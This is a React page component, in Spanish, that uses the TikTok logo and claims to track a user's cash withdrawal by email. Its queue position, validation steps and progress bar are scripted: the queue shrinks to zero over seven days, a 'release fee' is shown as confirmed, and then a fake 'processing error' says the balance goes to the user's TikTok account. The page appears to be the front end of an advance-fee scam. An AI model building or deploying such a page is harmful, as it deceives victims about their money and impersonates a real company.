import { useState } from "react";
import { createFileRoute } from "@tanstack/react-router";
import { Search, Info, Clock, CheckCircle2, ListOrdered, Calendar, CreditCard, Wallet } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";

export const Route = createFileRoute("/consulta-saque")({
  component: ConsultaSaque,
});

function ConsultaSaque() {
  const [email, setEmail] = useState("");
  const [status, setStatus] = useState<"idle" | "searching" | "validating" | "found" | "not_found">("idle");
  const [currentStepIndex, setCurrentStepIndex] = useState(-1);
  const [error, setError] = useState("");
  const [saqueData, setSaqueData] = useState<any>(null);
  const [currentQueuePos, setCurrentQueuePos] = useState<number | null>(null);
  const [isTestEmail, setIsTestEmail] = useState(false);

  const validationSteps = [
    "Localizando pedido...",
    "Validando correo del destinatario...",
    "Verificando tasa de liberación...",
    "Confirmando datos bancarios...",
    "Finalizando consulta..."
  ];

  const handleSearch = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim()) {
      setError("Ingrese el correo electrónico para consultar.");
      return;
    }
    
    setError("");
    setStatus("searching");
    
    try {
      const { data, error: dbError } = await supabase
        .from("saques")
        .select("*")
        .ilike("email_cliente", email.trim())
        .maybeSingle();

      if (dbError) throw dbError;

      const isTest = email.toLowerCase().trim() === "teste@exemplo.com";
      setIsTestEmail(isTest);

      if (data || isTest) {
        // Dados base
        const finalData = data || {
          numero_pedido: "SQ-TESTE-FINAL",
          status: "En fila",
          posicao_fila: 15420, // Aumentado para o teste
          total_solicitacoes: 38920,
          valor: 556.52,
          created_at: "2026-06-01T00:00:00Z",
          metodo_recebimento: "Bizum",
          previsao_dias: 7
        };

        // Calculo de dias passados
        const startDate = new Date(finalData.created_at);
        const now = new Date();
        const diffTime = Math.max(0, now.getTime() - startDate.getTime());
        const diffDays = Math.floor(diffTime / (1000 * 60 * 60 * 24));
        
        let displayPos = 0;
        const totalToReduce = Number(finalData.posicao_fila);
        const reductionPerDay = totalToReduce / 7;
        
        // Regra de 7 dias
        if (diffDays >= 7) {
          displayPos = 0;
        } else {
          displayPos = Math.max(1, Math.floor(totalToReduce - (reductionPerDay * diffDays)));
        }

        console.log("Debug Fila:", { isTest, diffDays, displayPos });

        setCurrentQueuePos(displayPos);
        setSaqueData(finalData);
        setStatus("validating");
        
        for (let i = 0; i < validationSteps.length; i++) {
          setCurrentStepIndex(i);
          await new Promise(resolve => setTimeout(resolve, 800));
        }
        
        setStatus("found");
      } else {
        setStatus("not_found");
      }
    } catch (err) {
      console.error("Erro ao buscar saque:", err);
      setError("Ocurrió un error al realizar la consulta. Inténtelo de nuevo.");
      setStatus("idle");
    }
  };

  const isFinished = currentQueuePos === 0;

  const steps = [
    { name: "Tarea completada", completed: true },
    { name: "Saldo validado", completed: true },
    { name: "Tasa de liberación confirmada", completed: true },
    { name: isFinished ? "Error de procesamiento" : "Esperando procesamiento bancario", current: !isFinished, error: isFinished },
    { name: "Retiro liberado", completed: false },
  ];

  const formatDate = (dateString: string) => {
    if (isTestEmail) return "01/06/2026";
    const date = new Date(dateString);
    return date.toLocaleDateString('es-ES');
  };


  return (
    <div className="min-h-screen bg-[#F8F8F8] py-12 px-4 sm:px-6 lg:px-8 font-sans">
      <div className="max-w-3xl mx-auto">
        {/* Header */}
        <div className="text-center mb-10">
          <div className="flex justify-center mb-6">
            <img 
              src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" 
              alt="TikTok Logo" 
              className="h-10 w-auto object-contain"
            />
          </div>
          <h1 className="text-2xl font-black text-[#000000] sm:text-4xl mb-2 tracking-tight">
            Siga su retiro
          </h1>
          <p className="text-base text-[#666666] font-medium px-4">
            Consulte el estado de su solicitud por el correo electrónico registrado en la compra.
          </p>
        </div>

        {/* Search Card */}
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-5 sm:p-6 mb-8">
          <form onSubmit={handleSearch} className="flex flex-col sm:flex-row gap-4">
            <div className="relative flex-grow">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <CheckCircle2 className="h-5 w-5 text-gray-400" />
              </div>
              <input
                type="email"
                value={email}
                onChange={(e) => {
                  setEmail(e.target.value);
                  if (error) setError("");
                }}
                placeholder="Ingrese su correo electrónico registrado"
                className={`block w-full pl-10 pr-3 py-3 border ${
                  error ? "border-[#fe2c55] ring-red-50" : "border-[#E8E8E8] ring-gray-50"
                } rounded-xl leading-5 bg-white placeholder-gray-400 focus:outline-none focus:ring-4 focus:border-[#fe2c55] sm:text-sm transition-all`}
              />
            </div>
            <button
              type="submit"
              disabled={status === "searching" || status === "validating"}
              className="inline-flex items-center justify-center px-6 py-3 border border-transparent text-base font-medium rounded-xl text-white bg-[#fe2c55] hover:bg-[#e8274d] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#fe2c55] transition-colors disabled:opacity-70 disabled:cursor-not-allowed"
            >
              {status === "searching" || status === "validating" ? (
                <>
                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  {status === "searching" ? "Localizando..." : "Validando..."}
                </>
              ) : (
                "Consultar retiro"
              )}
            </button>
          </form>
          {error && <p className="mt-2 text-sm text-[#fe2c55]">{error}</p>}
        </div>

        {status === "validating" && (
          <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-8 text-center animate-in fade-in zoom-in duration-500">
            <div className="flex flex-col items-center space-y-6">
              <div className="relative">
                <div className="w-16 h-16 border-4 border-gray-100 border-t-[#fe2c55] rounded-full animate-spin"></div>
                <div className="absolute inset-0 flex items-center justify-center">
                  <div className="w-8 h-8 bg-[#fe2c55] rounded-full animate-pulse"></div>
                </div>
              </div>
              <div className="space-y-4 w-full max-w-xs text-left">
                {validationSteps.map((step, idx) => (
                  <div 
                    key={idx}
                    className={`flex items-center space-x-3 text-sm transition-all duration-500 ${
                      idx < currentStepIndex ? "text-green-500 opacity-100" :
                      idx === currentStepIndex ? "text-gray-900 font-bold scale-105 opacity-100" :
                      "text-gray-300 opacity-50"
                    }`}
                  >
                    {idx < currentStepIndex ? (
                      <CheckCircle2 className="w-5 h-5 flex-shrink-0" />
                    ) : (
                      <div className={`w-5 h-5 rounded-full border-2 flex-shrink-0 flex items-center justify-center text-[10px] ${
                        idx === currentStepIndex ? "border-[#fe2c55] text-[#fe2c55]" : "border-gray-200 text-gray-200"
                      }`}>
                        {idx + 1}
                      </div>
                    )}
                    <span className="truncate">{step}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {status === "not_found" && (
          <div className="bg-amber-50 border border-amber-100 rounded-xl p-6 text-center animate-in fade-in slide-in-from-bottom-4 duration-500">
            <p className="text-amber-800 font-medium">Pedido no encontrado.</p>
            <p className="text-amber-600 text-sm mt-1">Verifique el correo ingresado e inténtelo de nuevo.</p>
          </div>
        )}

        {status === "found" && saqueData && (
          <div className="space-y-6 animate-in fade-in slide-in-from-bottom-8 duration-700">
            {/* Main Result Card */}
            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
              <div className="p-5 sm:p-6 border-b border-gray-50 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div>
                  <span className="text-[10px] font-bold uppercase tracking-widest text-gray-400">Número de pedido</span>
                  <p className="text-xl font-black text-gray-900">{saqueData.numero_pedido}</p>
                </div>
                <div className="inline-flex items-center px-3 py-1 rounded-full bg-rose-50 text-[#fe2c55] text-sm font-medium border border-rose-100">
                  <Clock className="w-4 h-4 mr-1.5" />
                  {isFinished ? "Fallo en el sistema" : saqueData.status}
                </div>
              </div>

              <div className="p-5 sm:p-6 bg-rose-50/30">
                <h3 className="text-base sm:text-lg font-bold text-gray-900 mb-2 leading-tight">¡Tasa de liberación confirmada con éxito!</h3>
                <p className="text-gray-600 text-sm font-medium">Su retiro ahora está en la fila prioritaria de procesamiento bancário.</p>
              </div>

              <div className="p-5 sm:p-6">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="flex items-start space-x-3">
                    <div className="p-2 bg-gray-50 rounded-lg">
                      <ListOrdered className="w-5 h-5 text-gray-500" />
                    </div>
                    <div>
                      <p className="text-xs text-gray-400 font-medium uppercase tracking-tight">Posición en la fila</p>
                      <p className="text-base font-semibold text-gray-900">
                        {isFinished ? "0" : `${currentQueuePos} de ${saqueData.total_solicitacoes}`} solicitudes
                      </p>
                    </div>
                  </div>

                  <div className="flex items-start space-x-3">
                    <div className="p-2 bg-gray-50 rounded-lg">
                      <Wallet className="w-5 h-5 text-gray-500" />
                    </div>
                    <div>
                      <p className="text-xs text-gray-400 font-medium uppercase tracking-tight">Valor solicitado</p>
                      <p className="text-base font-semibold text-gray-900 text-green-600">€ {Number(saqueData.valor).toLocaleString('de-DE', { minimumFractionDigits: 2 })}</p>
                    </div>
                  </div>

                  <div className="flex items-start space-x-3">
                    <div className="p-2 bg-gray-50 rounded-lg">
                      <Calendar className="w-5 h-5 text-gray-500" />
                    </div>
                    <div>
                      <p className="text-xs text-gray-400 font-medium uppercase tracking-tight">Fecha de solicitud</p>
                      <p className="text-base font-semibold text-gray-900">{formatDate(saqueData.created_at)}</p>
                    </div>
                  </div>

                  <div className="flex items-start space-x-3">
                    <div className="p-2 bg-gray-50 rounded-lg">
                      <CreditCard className="w-5 h-5 text-gray-500" />
                    </div>
                    <div>
                      <p className="text-xs text-gray-400 font-medium uppercase tracking-tight">Método de recepción</p>
                      <p className="text-base font-semibold text-gray-900">{saqueData.metodo_recebimento}</p>
                    </div>
                  </div>
                </div>
              </div>

              {/* Progress Bar */}
              <div className="p-5 sm:p-6 border-t border-gray-50 bg-gray-50/20">
                <div className="mb-6">
                  <div className="flex justify-between items-center mb-4">
                    <span className="text-sm font-semibold text-gray-700">Progreso del Retiro</span>
                    <span className="text-xs text-gray-500">{isFinished ? "95%" : "80%"} completado</span>
                  </div>
                  <div className="w-full h-2.5 bg-gray-200 rounded-full overflow-hidden">
                    <div className={`h-full ${isFinished ? "bg-amber-500 w-[95%]" : "bg-[#fe2c55] w-[80%]"} rounded-full transition-all duration-1000`}></div>
                  </div>
                </div>
                <div className="flex flex-col space-y-4 sm:space-y-0 sm:flex-row sm:justify-between relative">
                  {steps.map((step: any, idx) => (
                    <div key={idx} className="flex sm:flex-col items-center flex-1 relative z-10 group">
                      <div className={`flex items-center justify-center w-8 h-8 rounded-full border-2 ${
                        step.completed ? "bg-green-500 border-green-500 text-white" : 
                        step.error ? "bg-amber-500 border-amber-500 text-white" :
                        step.current ? "bg-[#fe2c55] border-[#fe2c55] text-white" : 
                        "bg-white border-gray-300 text-gray-300"
                      } transition-colors`}>
                        {step.completed ? (
                          <CheckCircle2 className="w-5 h-5" />
                        ) : (
                          <span className="text-xs font-bold">{idx + 1}</span>
                        )}
                      </div>
                      <span className={`ml-3 sm:ml-0 sm:mt-2 text-[10px] sm:text-center font-bold leading-tight max-w-[80px] ${
                        step.completed || step.current || step.error ? "text-gray-900" : "text-gray-400"
                      }`}>
                        {step.name}
                      </span>
                    </div>
                  ))}
                  <div className="hidden sm:block absolute top-4 left-[5%] right-[5%] h-[2px] bg-gray-200 -z-0">
                    <div className="h-full bg-green-500 transition-all duration-1000" style={{ width: '60%' }}></div>
                    <div className={`h-full ${isFinished ? "bg-amber-500" : "bg-[#fe2c55]"} transition-all duration-1000`} style={{ width: '20%', marginLeft: '60%' }}></div>
                  </div>
                </div>
              </div>
            </div>

            {/* Info Warning Card */}
            <div className={`${isFinished ? "bg-amber-50 border-amber-200" : "bg-rose-50 border-rose-100"} border rounded-2xl p-4 flex items-start space-x-3`}>
              {isFinished ? (
                <>
                  <Info className="w-5 h-5 text-amber-500 flex-shrink-0 mt-0.5" />
                  <p className="text-sm text-amber-800 leading-relaxed">
                    <strong>Error de transacción:</strong> Debido a un fallo técnico en el procesamiento externo, el saldo será transferido automáticamente a la cuenta de TikTok vinculada al correo registrado.
                  </p>
                </>
              ) : (
                <>
                  <Info className="w-5 h-5 text-[#fe2c55] flex-shrink-0 mt-0.5" />
                  <p className="text-sm text-rose-800 leading-relaxed">
                    Estamos procesando los retiros por orden de solicitud. El plazo puede variar según la demanda, validaciones internas y disponibilidad operativa.
                  </p>
                </>
              )}
            </div>
          </div>
        )}

        {/* Footer info */}
        <div className="mt-12 text-center text-sm text-gray-400 flex items-center justify-center space-x-4">
          <div className="flex items-center">
            <svg className="w-4 h-4 mr-1 text-green-500" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M2.166 4.9L10 1.554 17.834 4.9c.42.18.666.62.666 1.1v6.7c0 5.27-3.57 9.8-8.5 11.24-4.93-1.44-8.5-5.97-8.5-11.24V6c0-.48.246-.92.666-1.1zM10 3.3L4.5 5.65v5.35c0 4.14 2.8 7.7 5.5 8.7 2.7-1 5.5-4.56 5.5-8.7V5.65L10 3.3zm-2.5 8.5l2.5 2.5 5-5L13.5 8 10 11.5 8.5 10 7.5 11.8z" clipRule="evenodd" />
            </svg>
            Ambiente Seguro
          </div>
          <span>&copy; 2026 Sistema de Procesamiento de Retiros</span>
        </div>
      </div>
    </div>
  );
}
